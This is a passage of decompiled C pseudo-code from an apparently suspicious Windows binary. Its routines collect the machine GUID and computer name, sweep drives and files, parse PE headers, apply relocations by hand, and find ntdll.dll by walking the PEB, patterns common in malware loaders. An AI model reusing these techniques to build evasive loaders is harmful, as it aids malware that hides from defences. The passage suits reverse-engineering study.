    int32_t lpBuffer; // bp-40, 0x4139ad
    __asm_rep_stosd_memset((char *)&lpBuffer, 0, 8);
    GetComputerNameW((int16_t *)&lpBuffer, &nSize);
    function_40460a((int16_t *)&lpBuffer);
    int32_t result; // 0x4139ad
    return result;
}

// Address range: 0x4139e7 - 0x413ac9
int32_t function_4139e7(int32_t * a1, int32_t * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x4139e7
    int32_t result; // 0x4139e7
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    int32_t phkResult = 0; // bp-8, 0x4139f9
    int32_t v1; // bp-36, 0x4139e7
    int32_t v2 = &v1; // 0x413a08
    if (g304 == 0) {
        int32_t lpSubKey = *(int32_t *)function_40460a((int16_t *)0x41c1c8); // 0x413a25
        int32_t v3 = -0x7ffffffe; // bp-60, 0x413a27
        int32_t v4 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, (int16_t *)lpSubKey, 0, 257, (int32_t **)&phkResult); // 0x413a2c
        function_406f1d();
        int32_t * v5 = &v3; // 0x413a41
        if (v4 == 0) {
            int32_t v6 = function_40460a(L"MachineGuid"); // 0x413a4f
            int32_t v7 = v6; // bp-72, 0x413a54
            function_414d78(v6, (int32_t)&g322);
            function_406f1d();
            int32_t hKey = phkResult; // 0x413a65
            int32_t * v8 = &v7; // 0x413a68
            if (hKey != 0) {
                int32_t v9 = hKey; // bp-76, 0x413a6a
                RegCloseKey((int32_t *)hKey);
                v8 = &v9;
            }
            // 0x413a73
            phkResult = 0;
            v5 = v8;
        }
        int32_t v10 = function_406ffc(); // 0x413a7f
        v2 = (int32_t)v5 - 4;
        *(int32_t *)v2 = v10;
        function_403eca((int32_t)&g322);
        function_404081();
    }
    // 0x413aa2
    *(int32_t *)(v2 - 4) = (int32_t)&g303;
    function_403eca((int32_t)&g322);
    if (phkResult != 0) {
        // 0x413ab9
        *(int32_t *)(v2 - 8) = phkResult;
        RegCloseKey(&g322);
    }
    // 0x413ac2
    return result;
}

// Address range: 0x413ac9 - 0x413ad1
int32_t function_413ac9(void) {
    // 0x413ac9
    return function_406f1d();
}

// Address range: 0x413ad1 - 0x413ada
bool function_413ad1(int32_t * hEvent) {
    // 0x413ad1
    int32_t hEvent2; // 0x413ad1
    return SetEvent((int32_t *)hEvent2);
}

// Address range: 0x413ada - 0x413aec
int32_t function_413ada(int32_t a1) {
    // 0x413ada
    int32_t hHandle; // 0x413ada
    return WaitForSingleObject((int32_t *)hHandle, -1) == 0;
}

// Address range: 0x413aec - 0x413b18
int32_t function_413aec(int32_t a1) {
    // 0x413aec
    function_40415d(a1);
    int32_t v1; // 0x413aec
    int32_t * v2 = CreateEventA(NULL, true, false, (char *)*(int32_t *)(v1 + 4)); // 0x413b07
    *(int32_t *)v1 = (int32_t)v2;
    return 1;
}

// Address range: 0x413b18 - 0x413b22
int32_t function_413b18(void) {
    // 0x413b18
    int32_t result; // 0x413b18
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)result = 0;
    return result;
}

// Address range: 0x413b22 - 0x413b2f
int32_t function_413b22(void) {
    // 0x413b22
    int32_t lpExistingFileName; // 0x413b22
    return CopyFileW((int16_t *)lpExistingFileName, (int16_t *)lpExistingFileName, false);
}

// Address range: 0x413b2f - 0x413b7c
int32_t function_413b2f(void) {
    // 0x413b2f
    int32_t v1; // 0x413b2f
    int32_t * v2 = CreateFileW((int16_t *)*(int32_t *)(v1 + 4), -0x40000000, 1, NULL, 1, 0, NULL); // 0x413b46
    int32_t v3 = (int32_t)v2; // 0x413b46
    int32_t * v4 = (int32_t *)(v1 + 8); // 0x413b4c
    *v4 = v3;
    if (v2 != (int32_t *)-1) {
        // 0x413b76
        return v3 != -1;
    }
    // 0x413b54
    if (GetLastError() != 80) {
        // 0x413b76
        return *v4 != -1;
    }
    // 0x413b5f
    *v4 = 0;
    // 0x413b76
    return function_413f4f(-0x40000000);
}

// Address range: 0x413b7c - 0x413bf1
int32_t function_413b7c(int32_t a1, int32_t nNumberOfBytesToRead, int32_t dwMoveMethod) {
    // 0x413b7c
    int32_t v1; // 0x413b7c
    if (v1 != 0) {
        // 0x413b8a
        function_414047();
    }
    int32_t lpNumberOfBytesRead = 0; // bp-8, 0x413b95
    int32_t lpBuffer = function_406f77(); // 0x413b99
    int32_t * hFile = (int32_t *)(v1 + 8); // 0x413ba7
    SetFilePointer((int32_t *)*hFile, 0, NULL, dwMoveMethod);
    bool result = ReadFile((int32_t *)*hFile, (int32_t *)lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, NULL); // 0x413bbd
    function_403fc7(lpBuffer, nNumberOfBytesToRead);
    function_406f66();
    if (lpBuffer != 0) {
        // 0x413bde
        ReleaseMutex((int32_t *)*(int32_t *)(v1 + 12));
    }
    // 0x413be7
    return result;
}

// Address range: 0x413bf1 - 0x413c12
int32_t function_413bf1(int32_t a1, int32_t a2) {
    // 0x413bf1
    function_4043c7(a1);
    return function_413f4f(a2);
}

// Address range: 0x413c12 - 0x413c16
int32_t function_413c12(void) {
    // 0x413c12
    int32_t v1; // 0x413c12
    return *(int32_t *)(v1 + 20);
}

// Address range: 0x413c16 - 0x413c34
int32_t function_413c16(void) {
    // 0x413c16
    function_413ee1();
    function_41405b();
    int32_t result = function_406f1d(); // 0x413c29
    int32_t v1; // 0x413c16
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x413c34 - 0x413c83
int32_t function_413c34(int32_t a1) {
    int32_t v1 = 0; // bp-36, 0x413c4c
    int32_t v2 = SHFileOperationW((struct _SHFILEOPSTRUCTW *)&v1); // 0x413c6b
    function_406f1d();
    return v2 == 0;
}

// Address range: 0x413c83 - 0x413da4
int32_t function_413c83(int32_t lpFileName) {
    // 0x413c83
    function_401bbd();
    int32_t v1 = lpFileName; // bp-672, 0x413cb1
    int32_t v2 = &v1; // 0x413cb1
    char lpFindFileData; // bp-648, 0x413c83
    int32_t * v3 = FindFirstFileW((int16_t *)lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x413cb4
    int32_t v4 = v2; // 0x413cbd
    if (v3 != (int32_t *)-1) {
        // 0x413cc5
        int128_t v5; // 0x413c83
        int128_t v6 = v5;
        int64_t v7; // 0x413c83
        int64_t v8 = 0x100000000 * v7 >> 32; // 0x413ccf
        int32_t v9 = 0; // 0x413ccf
        int128_t v10 = v6; // 0x413ccf
        int32_t v11; // 0x413c83
        int32_t v12; // 0x413c83
        int64_t v13; // 0x413c83
        if ((lpFindFileData & 16) != 0) {
            // 0x413cd1
            v8 = v13;
            v10 = __asm_xorps(v6, v6);
            __asm_movlpd(v8, v10);
            v9 = 1;
            v12 = v11;
        }
        // 0x413cf7
        int32_t v14; // bp-604, 0x413c83
        *(int32_t *)(v2 - 4) = (int32_t)&v14;
        *(int32_t *)(v2 - 8) = function_40460a((int16_t *)&g322);
        function_4043c7((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v2 - 32) = 0;
        *(int32_t *)(v2 - 24) = (int32_t)v8;
        *(int32_t *)(v2 - 20) = v12;
        *(int32_t *)(v2 - 16) = v9;
        function_401abc((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v2 - 36) = (int32_t)&lpFindFileData;
        int32_t v15 = v2 - 40; // 0x413d6d
        *(int32_t *)v15 = (int32_t)v3;
        bool v16 = FindNextFileW(&g322, (struct _WIN32_FIND_DATAW *)&g322); // 0x413d6e
        *(int32_t *)(v2 - 44) = 0;
        v13 = v8;
        v11 = v12;
        v4 = v15;
        while (v16) {
            int32_t v17 = v15;
            v6 = v10;
            v8 = 0x100000000 * v7 >> 32;
            v9 = 0;
            v10 = v6;
            if ((lpFindFileData & 16) != 0) {
                // 0x413cd1
                v8 = v13;
                v10 = __asm_xorps(v6, v6);
                __asm_movlpd(v8, v10);
                v9 = 1;
                v12 = v11;
            }
            // 0x413cf7
            *(int32_t *)(v17 - 4) = (int32_t)&v14;
            *(int32_t *)(v17 - 8) = function_40460a((int16_t *)&g322);
            function_4043c7((int32_t)&g322);
            function_406f1d();
            *(int32_t *)(v17 - 32) = 0;
            *(int32_t *)(v17 - 24) = (int32_t)v8;
            *(int32_t *)(v17 - 20) = v12;
            *(int32_t *)(v17 - 16) = v9;
            function_401abc((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
            function_406f1d();
            *(int32_t *)(v17 - 36) = (int32_t)&lpFindFileData;
            v15 = v17 - 40;
            *(int32_t *)v15 = (int32_t)v3;
            v16 = FindNextFileW(&g322, (struct _WIN32_FIND_DATAW *)&g322);
            *(int32_t *)(v17 - 44) = 0;
            v13 = v8;
            v11 = v12;
            v4 = v15;
        }
    }
    // 0x413d82
    int32_t v18; // bp-56, 0x413c83
    *(int32_t *)(v4 - 4) = (int32_t)&v18;
    function_40153f(&g322);
    function_401586();
    function_406f1d();
    int32_t result; // 0x413c83
    return result;
}

// Address range: 0x413da4 - 0x413ee1
int32_t function_413da4(int32_t a1) {
    int32_t v1 = function_406fa7(); // 0x413db5
    function_401a34();
    int16_t * lpBuffer = (int16_t *)v1;
    int32_t v2 = 260; // bp-68, 0x413ddc
    int32_t nBufferLength = GetLogicalDriveStringsW(260, lpBuffer); // 0x413de1
    int16_t * lpBuffer2 = lpBuffer; // 0x413deb
    int32_t * v3 = &v2; // 0x413deb
    int32_t v4 = v1; // 0x413deb
    if (nBufferLength >= 261) {
        // 0x413ded
        function_406f8d();
        v4 = function_406fa7();
        lpBuffer2 = (int16_t *)v4;
        int32_t v5 = nBufferLength; // bp-76, 0x413e0f
        GetLogicalDriveStringsW(nBufferLength, lpBuffer2);
        v3 = &v5;
    }
    int32_t v6 = (int32_t)v3;
    int32_t v7 = v4; // 0x413e19
    int32_t v8 = v6; // 0x413e19
    if (*lpBuffer2 != 0) {
        *(int32_t *)(v6 - 4) = v7;
        *(int32_t *)(v6 - 8) = function_40460a(NULL);
        function_4043c7((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v6 - 12) = 0;
        int32_t v9 = GetDriveTypeW(NULL); // 0x413e45
        int32_t v10 = v6 - 24; // 0x413e4b
        *(int32_t *)v10 = 0;
        *(int32_t *)(v6 - 20) = v9;
        function_40193f((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
        v7 += 2;
        function_406f1d();
        v8 = v10;
        while (*(int16_t *)v7 != 0) {
            int32_t v11 = v10;
            *(int32_t *)(v11 - 4) = v7;
            *(int32_t *)(v11 - 8) = function_40460a(NULL);
            function_4043c7((int32_t)&g322);
            function_406f1d();
            *(int32_t *)(v11 - 12) = 0;
            v9 = GetDriveTypeW(NULL);
            v10 = v11 - 24;
            *(int32_t *)v10 = 0;
            *(int32_t *)(v11 - 20) = v9;
            function_40193f((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
            v7 += 2;
            function_406f1d();
            v8 = v10;
        }
    }
    // 0x413ebe
    function_406f8d();
    int32_t v12; // bp-48, 0x413da4
    *(int32_t *)(v8 - 4) = (int32_t)&v12;
    function_4014dd(&g322);
    function_401524();
    int32_t result; // 0x413da4
    return result;
}

// Address range: 0x413ee1 - 0x413ef9
int32_t function_413ee1(void) {
    // 0x413ee1
    int32_t v1; // 0x413ee1
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x413ee4
    int32_t hObject = *v2; // 0x413ee4
    int32_t result; // 0x413ee1
    if (hObject != 0) {
        bool handleClosed = CloseHandle((int32_t *)hObject); // 0x413eed
        *v2 = 0;
        result = handleClosed;
    }
    // 0x413ef7
    return result;
}

// Address range: 0x413ef9 - 0x413f4f
int32_t function_413ef9(int32_t a1) {
    // 0x413ef9
    int32_t v1; // 0x413ef9
    if (v1 != 0) {
        // 0x413f08
        function_414047();
    }
    int32_t * hFile = (int32_t *)(v1 + 8); // 0x413f14
    int32_t lpNumberOfBytesWritten = 0; // bp-8, 0x413f17
    SetFilePointer((int32_t *)*hFile, 0, NULL, 2);
    int32_t nNumberOfBytesToWrite = *(int32_t *)(a1 + 4); // 0x413f28
    int32_t lpBuffer = *(int32_t *)a1; // 0x413f2b
    bool result = WriteFile((int32_t *)*hFile, (int32_t *)lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL); // 0x413f30
    ReleaseMutex((int32_t *)*(int32_t *)(v1 + 12));
    return result;
}

// Address range: 0x413f4f - 0x413f8e
int32_t function_413f4f(int32_t dwDesiredAccess) {
    // 0x413f4f
    int32_t v1; // 0x413f4f
    int32_t * hFile = CreateFileW((int16_t *)*(int32_t *)(v1 + 4), dwDesiredAccess, 1, NULL, 3, 0, NULL); // 0x413f65
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x413f6b
    *v2 = (int32_t)hFile;
    int32_t result; // 0x413f4f
    if (hFile == (int32_t *)-1) {
        // 0x413f83
        *v2 = 0;
        result = 0;
    } else {
        // 0x413f73
        *(int32_t *)(v1 + 20) = GetFileSize(hFile, NULL);
        result = 1;
    }
    // 0x413f88
    return result;
}

// Address range: 0x413f8e - 0x413fc0
int32_t function_413f8e(void) {
    // 0x413f8e
    int32_t v1; // 0x413f8e
    int32_t * v2 = CreateFileW((int16_t *)*(int32_t *)(v1 + 4), 0x40000000, 1, NULL, 2, 0, NULL); // 0x413fa3
    *(int32_t *)(v1 + 8) = v2 != (int32_t *)-1 ? (int32_t)v2 : 0;
    return v2 != (int32_t *)-1;
}

// Address range: 0x413fc0 - 0x413fdb
int32_t function_413fc0(void) {
    // 0x413fc0
    int32_t result; // 0x413fc0
    *(int32_t *)(result + 4) = 0;
    function_414070(result);
    *(int32_t *)result = 0;
    *(int32_t *)(result + 8) = 0;
    return result;
}

// Address range: 0x413fdb - 0x414018
int32_t function_413fdb(int32_t a1, int32_t a2) {
    int32_t v1 = a1;
    int32_t result; // 0x413fdb
    *(int32_t *)(result + 4) = 0;
    function_414070(result);
    function_4043c7((int32_t)&v1);
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 20) = 0;
    *(int32_t *)result = a2;
    function_406f1d();
    return result;
}

// Address range: 0x414018 - 0x414020
void function_414018(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x414018
    int32_t lpCriticalSection2; // 0x414018
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)lpCriticalSection2);
}

// Address range: 0x414020 - 0x414028
void function_414020(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x414020
    int32_t lpCriticalSection2; // 0x414020
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)lpCriticalSection2);
}

// Address range: 0x414028 - 0x414030
void function_414028(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x414028
    int32_t lpCriticalSection2; // 0x414028
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)lpCriticalSection2);
}

// Address range: 0x414030 - 0x41403e
int32_t function_414030(void) {
    // 0x414030
    int32_t lpCriticalSection; // 0x414030
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)lpCriticalSection);
    return lpCriticalSection;
}

// Address range: 0x41403e - 0x414047
bool function_41403e(int32_t * hMutex) {
    // 0x41403e
    int32_t hMutex2; // 0x41403e
    return ReleaseMutex((int32_t *)hMutex2);
}

// Address range: 0x414047 - 0x41405b
int32_t function_414047(void) {
    // 0x414047
    int32_t hHandle; // 0x414047
    return WaitForSingleObject((int32_t *)hHandle, -1) == 0;
}

// Address range: 0x41405b - 0x414070
int32_t function_41405b(void) {
    // 0x41405b
    int32_t v1; // 0x41405b
    int32_t * hMutex = (int32_t *)v1; // 0x414060
    ReleaseMutex(hMutex);
    return CloseHandle(hMutex);
}

// Address range: 0x414070 - 0x414091
int32_t function_414070(int32_t a1) {
    int32_t * v1 = CreateMutexA(NULL, false, NULL); // 0x414078
    int32_t result; // 0x414070
    *(int32_t *)result = (int32_t)v1;
    *(int32_t *)(result + 4) = (int32_t)(v1 != (int32_t *)-1);
    return result;
}

// Address range: 0x414091 - 0x41411e
int32_t function_414091(int32_t * a1, int32_t a2) {
    // 0x414091
    int32_t v1; // 0x414091
    int32_t * v2 = (int32_t *)(v1 + 52); // 0x41409e
    if (*v2 == 0) {
        // 0x414117
        int32_t result; // 0x414091
        return result;
    }
    int32_t result3 = (int32_t)a1;
    int32_t result2 = v1 + 44;
    int32_t v3 = 0; // 0x4140ac
    int32_t v4 = 0;
    int32_t v5; // bp-76, 0x414091
    int32_t v6 = &v5;
    function_406d65();
    *(int32_t *)(v6 - 4) = *(int32_t *)result2 + v3;
    function_4148d1((int32_t)&g322);
    int32_t v7; // bp-64, 0x414091
    *(int32_t *)(v6 - 8) = (int32_t)&v7;
    function_40434f((char *)&g322);
    int32_t v8 = v6 - 12; // 0x4140d3
    *(int32_t *)v8 = a2;
    int32_t v9 = function_404333((int32_t)&g322); // 0x4140d9
    function_406f1d();
    function_404081();
    while (v9 == 0) {
        int32_t v10 = v4 + 1; // 0x4140fa
        v3 += 48;
        if (v10 >= *v2) {
            // 0x414117
            return result2;
        }
        v4 = v10;
        v6 = v8;
        function_406d65();
        *(int32_t *)(v6 - 4) = *(int32_t *)result2 + v3;
        function_4148d1((int32_t)&g322);
        *(int32_t *)(v6 - 8) = (int32_t)&v7;
        function_40434f((char *)&g322);
        v8 = v6 - 12;
        *(int32_t *)v8 = a2;
        v9 = function_404333((int32_t)&g322);
        function_406f1d();
        function_404081();
    }
    // 0x414108
    *(int32_t *)(v6 - 16) = v4;
    *(int32_t *)(v6 - 20) = result3;
    function_402c80((int32_t)&g322, (int32_t)&g322);
    // 0x414117
    return result3;
}

// Address range: 0x41411e - 0x414227
int32_t function_41411e(int32_t a1) {
    // 0x41411e
    int32_t v1; // 0x41411e
    *(int32_t *)(v1 + 32) = a1;
    if (*(int16_t *)a1 != 0x5a4d) {
        // 0x414220
        return 0;
    }
    int32_t v2 = *(int32_t *)(a1 + 60) + a1; // 0x41413d
    if (*(int32_t *)v2 != 0x4550) {
        // 0x414220
        return 0;
    }
    int16_t v3 = *(int16_t *)(v2 + 4); // 0x41414b
    int32_t v4; // bp-24, 0x41411e
    if (v3 == 332) {
        // 0x414159
        *(int32_t *)(v1 + 64) = 1;
        int32_t * v5 = (int32_t *)(v1 + 36); // 0x414163
        *v5 = v2;
        v4 = a1;
        function_403fc7(a1, *(int32_t *)(v2 + 84));
        int32_t v6 = *v5; // 0x41416f
        if (*(int16_t *)(v6 + 6) == 0) {
            // 0x414216
            *(int32_t *)(v1 + 60) = 1;
            // 0x414220
            return 1;
        }
        int32_t v7 = 0; // 0x4141a9
        int32_t v8 = v6 + 24 + (int32_t)*(int16_t *)(v6 + 20); // 0x41411e
        int32_t v9 = &v4;
        *(int32_t *)(v9 - 52) = v9 - 48;
        *(int32_t *)(v9 - 56) = v8;
        int32_t v10 = v9 - 60; // 0x414192
        *(int32_t *)v10 = a1;
        function_414894(v7, (int32_t)&g322);
        function_402b7b();
        v7++;
        v8 += 40;
        while (v7 < (int32_t)*(int16_t *)(*v5 + 6)) {
            // 0x41418b
            v9 = v10;
            *(int32_t *)(v9 - 52) = v9 - 48;
            *(int32_t *)(v9 - 56) = v8;
            v10 = v9 - 60;
            *(int32_t *)v10 = a1;
            function_414894(v7, (int32_t)&g322);
            function_402b7b();
            v7++;
            v8 += 40;
        }
        // 0x414216
        *(int32_t *)(v1 + 60) = 1;
        // 0x414220
        return 1;
    }
    if (v3 != -0x799c) {
        // 0x414216
        *(int32_t *)(v1 + 60) = 1;
        // 0x414220
        return 1;
    }
    int32_t * v11 = (int32_t *)(v1 + 40); // 0x4141c3
    *v11 = v2;
    *(int32_t *)(v1 + 64) = 0;
    v4 = a1;
    function_403fc7(a1, *(int32_t *)(v2 + 84));
    int32_t v12 = *v11; // 0x4141d5
    if (*(int16_t *)(v12 + 6) == 0) {
        // 0x414216
        *(int32_t *)(v1 + 60) = 1;
        // 0x414220
        return 1;
    }
    int32_t v13 = v12 + 24 + (int32_t)*(int16_t *)(v12 + 20); // 0x41411e
    int32_t v14 = 0; // 0x414204
    int32_t v15 = &v4;
    *(int32_t *)(v15 - 52) = v15 - 48;
    *(int32_t *)(v15 - 56) = v13;
    int32_t v16 = v15 - 60; // 0x4141f3
    *(int32_t *)v16 = a1;
    function_414894(v13, (int32_t)&g322);
    function_402b7b();
    v14++;
    v13 += 40;
    while (v14 < (int32_t)*(int16_t *)(*v11 + 6)) {
        // 0x4141ec
        v15 = v16;
        *(int32_t *)(v15 - 52) = v15 - 48;
        *(int32_t *)(v15 - 56) = v13;
        v16 = v15 - 60;
        *(int32_t *)v16 = a1;
        function_414894(v13, (int32_t)&g322);
        function_402b7b();
        v14++;
        v13 += 40;
    }
    // 0x414216
    *(int32_t *)(v1 + 60) = 1;
    // 0x414220
    return 1;
}

// Address range: 0x414227 - 0x414278
int32_t function_414227(void) {
    // 0x414227
    function_413fc0();
    int32_t result; // 0x414227
    *(int32_t *)(result + 24) = 0;
    *(int32_t *)(result + 28) = 0;
    *(int32_t *)(result + 56) = 5;
    *(int32_t *)(result + 48) = 5;
    *(int32_t *)(result + 52) = 0;
    int32_t v1 = function_406fa7(); // 0x41424a
    if (v1 == 0) {
        // 0x41426c
        *(int32_t *)(result + 44) = 0;
        *(int32_t *)(result + 60) = 0;
        return result;
    }
    // 0x414253
    *(int32_t *)v1 = 5;
    int32_t v2 = v1 + 44; // 0x414258
    int32_t v3 = 5; // 0x414258
    *(int32_t *)v2 = 0;
    *(int32_t *)(v2 + 4) = 0;
    v3--;
    v2 += 48;
    while (v3 != 0) {
        // 0x41425b
        *(int32_t *)v2 = 0;
        *(int32_t *)(v2 + 4) = 0;
        v3--;
        v2 += 48;
    }
    // 0x41426c
    *(int32_t *)(result + 44) = v1 + 4;
    *(int32_t *)(result + 60) = 0;
    return result;
}

// Address range: 0x414278 - 0x4143ed
int32_t function_414278(int32_t result, uint32_t a2, int32_t a3) {
    // 0x414278
    int32_t v1; // 0x414278
    if (v1 == 0) {
        // 0x4143e4
        return result;
    }
    // 0x414299
    int32_t v2; // bp-36, 0x414278
    int32_t * v3 = (int32_t *)((int32_t)&v2 - 4);
    int32_t v4 = result; // 0x4143d8
    int32_t v5; // 0x414278
    int32_t v6; // 0x414278
    int32_t v7; // 0x414278
    while (true) {
      lab_0x414299:;
        int32_t v8 = v6;
        int32_t v9 = v4;
        int16_t * v10 = (int16_t *)v9; // 0x414299
        uint16_t v11 = *v10; // 0x414299
        int32_t v12 = v8 - 1; // 0x41429c
        int32_t v13 = v1 + (int32_t)(v11 % 0x1000); // 0x4142b4
        if ((v11 & -0x1000) != 0x3000) {
            if ((v11 & -0x1000) != 0x1000) {
                if ((v11 & -0x1000) != 0x4000) {
                    // 0x414348
                    *v3 = 2;
                    if ((v11 & -0x1000) != 0x2000) {
                        // 0x414358
                        v5 = v9;
                        v7 = v12;
                        switch (v11 / 0x1000) {
                            case 0: {
                                goto lab_0x4143d5;
                            }
                            case 6: {
                                goto lab_0x4143d5;
                            }
                            case 7: {
                                goto lab_0x4143d5;
                            }
                            default: {
                                // 0x414369
                                if ((v11 & -0x1000) != -0x5000) {
                                    // break -> 0x4143e4
                                    break;
                                }
                                // 0x41436f
                                *v3 = 2;
                                int16_t * v14 = (int16_t *)v13; // 0x414374
                                uint16_t v15 = *v14; // 0x414374
                                *v3 = 2;
                                int32_t v16 = v9 + 4; // 0x41437f
                                uint32_t v17 = (int32_t)*(int16_t *)v16; // 0x41438d
                                uint32_t v18 = 0x10000 * v17 | (int32_t)*(int16_t *)(v9 + 2); // 0x4143a3
                                uint32_t v19 = v18 + a2; // 0x4143ac
                                *v14 = (int16_t)(((0x10000 * ((int32_t)v15 + a3 + v17 / 0x10000 + (int32_t)(v19 < v18) + (int32_t)(v19 > 0xffff7fff)) | (v19 + 0x8000) / 0x10000) + 0x8000) / 0x10000);
                                v5 = v16;
                                v7 = v12 - *v3;
                                goto lab_0x4143d5;
                            }
                        }
                    } else {
                        int16_t * v20 = (int16_t *)v13; // 0x414353
                        *v20 = *v20 + (int16_t)a2;
                        v5 = v9;
                        v7 = v12;
                        goto lab_0x4143d5;
                    }
                } else {
                    int32_t v21 = v9 + 2; // 0x4142e6
                    int32_t v22 = v8 - 2; // 0x4142e9
                    v5 = v21;
                    v7 = v22;
                    if ((v11 & 2) == 0) {
                        int16_t * v23 = (int16_t *)v13; // 0x4142fc
                        uint32_t v24 = a2 + 0x8000 + (int32_t)*(int16_t *)v21; // 0x414307
                        *v23 = (int16_t)((0x10000 * (int32_t)*v23 + v24) / 0x10000);
                        int32_t v25 = v24 / 0x10000 - a2 / 0x10000; // 0x414321
                        if (v25 != 1) {
                            // 0x414332
                            v5 = v21;
                            v7 = v22;
                            if (v25 != 0) {
                                // 0x41433d
                                *v3 = 2;
                                *v10 = *v10 | 2;
                                v5 = v21;
                                v7 = v22;
                            }
                        } else {
                            // 0x41432a
                            *v10 = *v10 | 1;
                            v5 = v21;
                            v7 = v22;
                        }
                    }
                    goto lab_0x4143d5;
                }
            } else {
                int16_t * v26 = (int16_t *)v13; // 0x4142cd
                *v26 = (int16_t)((0x10000 * (int32_t)*v26 + a2) / 0x10000);
                v5 = v9;
                v7 = v12;
                goto lab_0x4143d5;
            }
        } else {
            int32_t * v27 = (int32_t *)v13; // 0x4142c0
            *v27 = *v27 + a2;
            v5 = v9;
            v7 = v12;
            goto lab_0x4143d5;
        }
    }
  lab_0x4143e4:;
    // 0x4143e4
    int32_t result2; // 0x414278
    return result2;
  lab_0x4143d5:
    // 0x4143d5
    *v3 = 2;
    v4 = v5 + 2;
    v6 = v7;
    result2 = v4;
    if (v7 == 0) {
        // break -> 0x4143e4
        goto lab_0x4143e4;
    }
    goto lab_0x414299;
}

// Address range: 0x4143ed - 0x4143f4
int32_t function_4143ed(int32_t Offset) {
    // 0x4143ed
    return __readfsdword(Offset);
}

// Address range: 0x4143f4 - 0x414422
int32_t function_4143f4(void) {
    int32_t v1 = *(int32_t *)(__readfsdword(48) + 12) + 20; // 0x4143ff
    int32_t v2 = v1; // 0x414404
    v2 = *(int32_t *)v2;
    int32_t result = 0; // 0x414416
    while (v2 != v1) {
        // 0x414406
        if (function_4144b6() == 0) {
            // 0x41441d
            result = *(int32_t *)(v2 + 16);
            return result;
        }
        v2 = *(int32_t *)v2;
        result = 0;
    }
  lab_0x41441a:
    // 0x41441a
    return result;
}

// Address range: 0x414422 - 0x414498
int32_t function_414422(uint32_t a1, int32_t * a2) {
    int32_t v1 = function_414498(); // 0x414429
    if (v1 == 0) {
        // 0x414494
        return 0;
    }
    int16_t v2 = *(int16_t *)(v1 + 4); // 0x414432
    int32_t v3; // 0x414422
    int32_t v4; // 0x414422
    int32_t v5; // 0x414422
    if (v2 != 332) {
        // 0x414462
        if (v2 != -0x799c) {
            // 0x414494
            return 0;
        }
        int32_t v6 = v1 + 8 * a1;
        int32_t v7 = *(int32_t *)(v6 + 136); // 0x41446f
        if (v7 == 0 || *(int32_t *)(v1 + 132) <= a1) {
            // 0x414494
            return 0;
        }
        // 0x414482
        if (a2 == NULL) {
            // 0x414494
            return v7 + v5;
        }
        // 0x414489
        v3 = v7;
        v4 = v6 + 140;
    } else {
        int32_t v8 = v1 + 8 * a1;
        int32_t v9 = *(int32_t *)(v8 + 120); // 0x414443
        if (v9 == 0 || *(int32_t *)(v1 + 116) <= a1) {
            // 0x414494
            return 0;
        }
        // 0x414450
        if (a2 == NULL) {
            // 0x414494
            return v9 + v5;
        }
        // 0x414457
        v3 = v9;
        v4 = v8 + 124;
    }
    // 0x41445b
    *a2 = *(int32_t *)v4;
    // 0x414494
    return v3 + v5;
}

// Address range: 0x414498 - 0x4144b6
int32_t function_414498(void) {
    // 0x414498
    int32_t v1; // 0x414498
    int32_t v2 = v1;
    if ((int16_t)v2 != 0x5a4d) {
        // 0x4144b3
        return 0;
    }
    int32_t v3 = *(int32_t *)(v2 + 60) + v2; // 0x4144a7
    return *(int32_t *)v3 == 0x4550 ? v3 : 0;
}

// Address range: 0x4144b6 - 0x4144f8
int32_t function_4144b6(void) {
    // 0x4144b6
    int32_t v1; // 0x4144b6
    if ((int16_t)v1 == 0) {
        // 0x4144f5
        return -1;
    }
    int32_t v2 = v1 - (int32_t)L"ntdll.dll"; // 0x4144c4
    int32_t v3 = (int32_t)L"ntdll.dll"; // 0x4144c4
    uint16_t v4 = *(int16_t *)v3; // 0x4144c6
    int32_t result = 1; // 0x4144cc
    while (v4 != 0) {
        uint16_t v5 = *(int16_t *)(v3 + v2); // 0x4144ce
        result = -1;
        if (v5 < v4) {
            // break -> 0x4144f5
            break;
        }
        // 0x4144d7
        result = 1;
        if (v5 > v4) {
            // break -> 0x4144f5
            break;
        }
        // 0x4144d9
        v3 += 2;
        if (*(int16_t *)(v3 + v2) == 0) {
            // 0x4144e2
            result = *(int16_t *)v3 != 0;
            return result;
        }
        v4 = *(int16_t *)v3;
        result = 1;
    }
  lab_0x4144f5:
    // 0x4144f5
    return result;
}

// Address range: 0x4144f8 - 0x41452d
int32_t function_4144f8(void) {
    // 0x4144f8
    int32_t v1; // 0x4144f8
    if ((char)v1 == 0) {
        // 0x414523
        return -1;
    }
    int32_t v2 = v1 - (int32_t)"ntdll.dll"; // 0x414503
    int32_t v3 = (int32_t)"ntdll.dll"; // 0x414503
    unsigned char v4 = *(char *)v3; // 0x414505
    int32_t result = 1; // 0x414509
    while (v4 != 0) {
        unsigned char v5 = *(char *)(v3 + v2); // 0x41450b
        result = -1;
        if (v5 < v4) {
            // break -> 0x414523
            break;
        }
        // 0x414510
        result = 1;
        if (v5 > v4) {
            // break -> 0x414523
            break;
        }
        // 0x414512
        v3++;
        if (*(char *)(v3 + v2) == 0) {
            // 0x414519
